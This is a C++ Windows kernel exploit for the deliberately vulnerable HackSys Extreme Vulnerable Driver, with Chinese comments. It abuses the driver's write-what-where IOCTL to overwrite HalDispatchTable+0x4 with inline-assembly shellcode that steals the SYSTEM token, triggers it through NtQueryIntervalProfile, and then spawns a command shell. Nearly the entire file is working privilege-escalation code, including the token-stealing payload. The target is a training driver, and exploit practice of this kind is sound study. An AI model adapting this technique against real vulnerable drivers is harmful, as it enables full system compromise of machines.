// 4任意内存覆盖漏洞.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
//#include<profileapi.h>
#pragma comment(lib, "Psapi.lib")

#define Write_What_Where  0x22200B
/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                     Write-What-Where                                 */
/************************************************************************/

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS (WINAPI*NtQueryIntervalProfile_t)(ULONG ProfileSource,PULONG Interval);

HANDLE hDevice = NULL;

__declspec(naked)  VOID __stdcall ShellCode(DWORD a1,DWORD a2,DWORD a3,DWORD a4)
{
	_asm
	{
		int 3;
			//pop edi	;
			//pop esi;
			//pop ebx;
			pushad;
			mov eax, fs: [124h];		// Find the _KTHREAD structure for the current thread
			mov eax, [eax + 0x150];   // Find the _EPROCESS structure
			mov ecx, eax;
			mov edx, 4;				// edx = system PID(4)

			// The loop is to get the _EPROCESS of the system
find_sys_pid :
			mov eax, [eax + 0xb8];	// Find the process activity list
			sub eax, 0xb8 ;   		// List traversal
			cmp[eax + 0xb4], edx;    // Determine whether it is SYSTEM based on PID
			jnz find_sys_pid;

			// Replace the Token
			mov edx, [eax + 0xf8];
			mov[ecx + 0xf8], edx;
			popad;
			ret 0x10;
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}


LPVOID NtkrnlpaBase()
{
	LPVOID lpDriverBase[2028]={0};
	CHAR name[1024]={0};
	DWORD neededsize=0;
	EnumDeviceDrivers(lpDriverBase,sizeof(lpDriverBase),&neededsize);
	
	for (int i=0;i<1024;i++)
	{
		if (lpDriverBase[i]==0)
		{
			break;
		}
		GetDeviceDriverBaseNameA(lpDriverBase[i],name,48);
		printf("finde-------》 %s   %x\n",name,lpDriverBase[i]);
		if (!strcmp(name,"ntoskrnl.exe"))
		{
			printf("finde ntkrnlpa.exe\n");
			return lpDriverBase[i];
		}
	}
	return NULL;

}

DWORD32 GetHalOffset_4()
{
	//1,获取ntos模块的基址
	//LPVOID ntBase=NtkrnlpaBase();
	//printf("[+]ntBase %x ...\n",ntBase);
	//HMODULE h=LoadLibraryA("ntkrnlpa.exe");
	////HalDispatchTable是导出变量
	//PVOID NtQueryIntervalProfileAddr=GetProcAddress(h,"HalDispatchTable");
	//printf("[+]NtQueryIntervalProfileAddr %x ...\n",NtQueryIntervalProfileAddr);
	//DWORD32 offset=(DWORD32)NtQueryIntervalProfileAddr-(DWORD32)h+4;
	//printf("[+]offset %x ...\n",offset);
	//printf("[+]GetHalOffset_4 %x ...\n",offset+(DWORD32)ntBase);
	//return offset+(DWORD32)ntBase;
	// ntkrnlpa.exe in kernel space base address
	PVOID pNtkrnlpaBase = NtkrnlpaBase();

	printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);

	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntkrnlpa.exe");

	// HalDispatchTable in user space address
	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;

	printf("[+]HalDispatchTable+0x4 is 0x%p\n", hal_4);

	return (DWORD32)hal_4-0x9000;

}

VOID Trigger_shellcode(DWORD32 where, DWORD32 what)
{

	WRITE_WHAT_WHERE exploit;
	DWORD lpbReturn = 0;

	exploit.Where = (PULONG_PTR)where;
	exploit.What = (PULONG_PTR)& what;
	printf("[+]Write at 0x%p\n", where);
	printf("[+]Write with 0x%p\n", what);

	printf("[+]Start to trigger...\n");

	DeviceIoControl(hDevice,
		Write_What_Where,
		&exploit,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("[+]Success to trigger...\n");
}


BOOL init()
{
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("[+]Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf("[+]Success to get HANDLE!\n");
	return TRUE;
}

int main()
{
	DWORD interVal = 0;

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return 0;
	}
	
	//获得HalDispatchTable+0x4的地址
	DWORD32 Hal_hook_address = GetHalOffset_4();

	printf("[+]HalDispatchTable+0x4 is 0x%p\n", Hal_hook_address);
	
	//触发漏洞
	Trigger_shellcode((DWORD32)Hal_hook_address, (DWORD32)& ShellCode);

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);
	
	//调用这个函数，去执行我的shellcode
	//触发这个函数
	NtQueryIntervalProfile(0x1337, &interVal);

	printf("[+]Start to Create cmd...\n");
	CreateCmd();

	system("pause");
	return 0;
}
